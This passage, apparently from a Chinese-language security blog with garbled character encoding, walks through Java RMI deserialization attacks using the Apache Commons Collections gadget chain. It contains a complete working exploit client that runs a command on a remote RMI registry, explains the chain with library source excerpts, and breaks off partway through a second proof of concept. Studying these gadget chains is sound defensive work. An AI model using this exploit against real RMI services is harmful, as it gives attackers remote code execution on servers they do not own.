è¾“å®Œæˆåå†è¿›è¡Œååºåˆ—åŒ–ï¼›å®¢æˆ·ç«¯æä¾›æ„é€ å¥½çš„æ¶æ„æ•°æ®ï¼ŒæœåŠ¡å™¨ç«¯æ¥æ”¶åè¿›è¡Œååºåˆ—åŒ–è§¦å‘ä»£ç æ‰§è¡Œã€‚</p><ul><li>èƒ½å¤Ÿè¿›è¡Œ RMI é€šä¿¡</li><li>æœåŠ¡å™¨å¼•ç”¨ç¬¬ä¸‰æ–¹å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„åŒ…</li></ul><p>ç»“åˆ Apache Commons Collections ååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€  POC</p><ul><li>jdk 8u121ä»¥ä¸‹ï¼ˆè¿™é‡Œé€‰æ‹© 8u111 å¤ç°ï¼‰</li><li><a href="https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/commons-collections-3.1.jar">commons-collections-3.1.jar</a></li></ul><p>Server å’ŒæœåŠ¡ä»ç„¶ä½¿ç”¨ä¸Šé¢çš„ä»£ç ï¼Œä¿®æ”¹ Client çš„é€»è¾‘ï¼Œæ„é€ èƒ½å¤Ÿè§¦å‘ä»£ç æ‰§è¡Œçš„åºåˆ—åŒ–å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIexploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// è¿œç¨‹ RMI Server çš„åœ°å€</span></span><br><span class="line">        String ip = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1099</span>;</span><br><span class="line">        <span class="comment">// è¦æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">        String command = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">final</span> String ANN_INV_HANDLER_CLASS = <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ„é€  transformers</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123; command &#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">        <span class="comment">// æ„é€  chainedtransformer</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// TiedMapEntry ç±»ä¸­è°ƒç”¨ Map ç±»çš„ get æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// LazyMap çš„ get æ–¹æ³•è°ƒç”¨ transform</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// BadAttributeValueExpException é‡å†™ readObject æ–¹æ³•ï¼Œè°ƒç”¨è¾“å…¥æµçš„ toString æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// TiremapEntry çš„ getValue æ–¹æ³•è°ƒç”¨ LazyMap çš„ get æ–¹æ³•</span></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        <span class="comment">// è®¾ç½® TiedMapEntry</span></span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(badAttributeValueExpException, entry);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æŠŠ BadAttributeValueExpException å¯¹è±¡å°è£…åœ¨ Map ä¸­</span></span><br><span class="line">        String name = <span class="string">&quot;pwned&quot;</span> + System.nanoTime();</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        map.put(name, badAttributeValueExpException);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è·å¾— AnnotationInvocationHandler çš„æ„é€ å‡½æ•°</span></span><br><span class="line">        Constructor cl = Class.forName(ANN_INV_HANDLER_CLASS).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        cl.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æŠŠ Map å°è£…åˆ° AnnotationInvocationHandler ä¸­ï¼Œè½¬æ¢ä¸º Remote ç±»å‹</span></span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªä»£ç†</span></span><br><span class="line">        InvocationHandler hl = (InvocationHandler)cl.newInstance(Override.class, map);</span><br><span class="line">        Object object = Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Remote.class&#125;, hl);</span><br><span class="line">        Remote remote = Remote.class.cast(object);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(ip, port);</span><br><span class="line">        registry.bind(name, remote);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><img src="https://i.loli.net/2021/09/16/18OfJbtvEo64U3F.jpg" ><h3 id="Apache-CommonsCollections"><a href="#Apache-CommonsCollections" class="headerlink" title="Apache CommonsCollections"></a>Apache CommonsCollections</h3><blockquote><p>åˆ©ç”¨ ChainedTransformer æ„é€ æ¶æ„ä»£ç æ‰§è¡Œé“¾ï¼Œååºåˆ—åŒ–æ—¶è§¦å‘å…¶ transform æ–¹æ³•é€šè¿‡åå°„è°ƒç”¨æ„é€ å¥½çš„æ¶æ„ä»£ç <br>TransformedMap ä¿®æ”¹ key å°±ä¼šè§¦å‘è°ƒç”¨ç›¸åº”çš„ transformer.transform<br>åŠ¨æ€ä»£ç† AnnotationInvocationHandler åœ¨ååºåˆ—åŒ–æ—¶å¯¹å…¶å˜é‡è¿›è¡Œè®¾ç½®æ“ä½œ<br>ChainedTransformer å’Œ AnnotationInvocationHandler å¯ä½œä¸ºå…¶ä»– gadget çš„â€œååŠâ€éƒ¨åˆ†</p></blockquote><p>åå°„æœºåˆ¶ï¼šåœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§ã€‚</p><p>æ¼æ´æˆå› ï¼šInvokerTransformer ç±»å®ç°çš„ Transformer æ¥å£ï¼Œå¯ä»¥é€šè¿‡ Java åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„å‡½æ•°ã€‚</p><p>è¿œç¨‹ä»£ç æ‰§è¡Œï¼šClient æ„é€ æ¶æ„åºåˆ—åŒ–å¯¹è±¡ï¼ŒServer ååºåˆ—åŒ–è§¦å‘ <code>readObject</code> æ–¹æ³•ï¼Œè§¦å‘æ„é€ å¥½çš„ Transformer åºåˆ—ï¼Œå®ç°ä»£ç æ‰§è¡Œã€‚</p><img src="https://i.loli.net/2021/09/16/43poxMzsqw78rDm.png" ><p>Map ç±»æ˜¯å­˜å‚¨é”®å€¼å¯¹çš„æ•°æ®ç»“æ„ï¼ŒApache Commons Collectionsä¸­å®ç°äº†ç±» TransformedMapï¼Œç”¨æ¥å¯¹ Map è¿›è¡ŒæŸç§å˜æ¢ï¼Œåªè¦è°ƒç”¨ <code>decorate()</code> å‡½æ•°ï¼Œä¼ å…¥ key å’Œ value çš„å˜æ¢å‡½æ•° Transformerï¼Œå³å¯ä»ä»»æ„ Map å¯¹è±¡ç”Ÿæˆç›¸åº”çš„ TransformedMapã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>(map);</span><br><span class="line"><span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line"><span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Transformer æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶ä¸­å®šä¹‰çš„ <code>transform()</code> å‡½æ•°ç”¨æ¥å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆå¦ä¸€ä¸ªå¯¹è±¡ã€‚å½“ Map ä¸­çš„ä»»æ„é¡¹çš„ key æˆ–è€… value è¢«ä¿®æ”¹ï¼Œç›¸åº”çš„ Transformer å°±ä¼šè¢«è°ƒç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Apache Commons Collections ä¸­å·²ç»å®ç°äº†ä¸€äº›å¸¸è§çš„ Transformerï¼Œå…¶ä¸­çš„ InvokerTransformer å¯ä»¥é€šè¿‡è°ƒç”¨ Java çš„åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼š</p><ul><li>å¯æ§å‚æ•° <code>iMethodName</code>ã€<code>iParamTypes</code>ã€<code>iArgs</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName; <span class="comment">// æ–¹æ³•åç§°</span></span><br><span class="line">        iParamTypes = paramTypes; <span class="comment">// å‚æ•°ç±»å‹</span></span><br><span class="line">        iArgs = args;  <span class="comment">// å‚æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ConstantTransformer çš„ <code>transform()</code> æ–¹æ³•ï¼Œè¿”å› iConstant å±æ€§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ChainedTransformer æ¥å— Transformer æ•°ç»„ï¼Œ<code>transform</code> æ–¹æ³•å¾ªç¯è°ƒç”¨ Transformer çš„ transform æ–¹æ³•ï¼Œå¹¶ä½¿ç”¨å‰ä¸€ä¸ª object ä½œä¸ºå‚æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨éœ€è¦è§¦å‘ ChainedTransformer å¯¹è±¡çš„ <code>transform()</code> å‡½æ•°ï¼Œè€Œ TransformedMap çš„ <code>checkSetValue</code> å‡½æ•°ä¸­å°±è°ƒç”¨äº† <code>transform</code> æ–¹æ³•ï¼Œé‚£ä¹ˆå°±è¦é€šè¿‡æ„é€ ä¸€ä¸ª Map å’Œä¸€ä¸ªèƒ½æ‰§è¡Œä»£ç çš„ ChainedTransformer ä»¥æ­¤ç”Ÿæˆ TransformedMapï¼Œç„¶åä¿®æ”¹ Map è§¦å‘ Transformer è°ƒç”¨ã€‚</p><p>TransformedMap ä¸­æœ‰ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨äº† <code>transform()</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">transformKey</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (keyTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> object;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (valueTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> object;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>åŠ¨æ€ä»£ç†ï¼ˆDynamic Proxyï¼‰ AnnotationInvocationHandler ç±»çš„ <code>memberValues</code> æ˜¯ Map ç±»å‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>AnnotationInvocationHandler çš„ <code>readObject</code> å‡½æ•°å¯¹ <code>memberValues</code> çš„æ¯ä¸€é¡¹è°ƒç”¨ <code>setValue</code> å‡½æ•°ï¼Œè€Œè¯¥å‡½æ•°ä¼šè§¦å‘ TransformedMap çš„ <code>checkSetValue</code> æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// è§¦å‘ Transformer</span></span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–å¯¹è±¡è§¦å‘ä»£ç æ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject -&gt; Map.setValue -&gt; TransformedMap.checkSetValue -&gt; ChainedTransformer.transform -&gt; InvokeTransformer.transform -&gt; ä»£ç æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>POC ç¤ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span 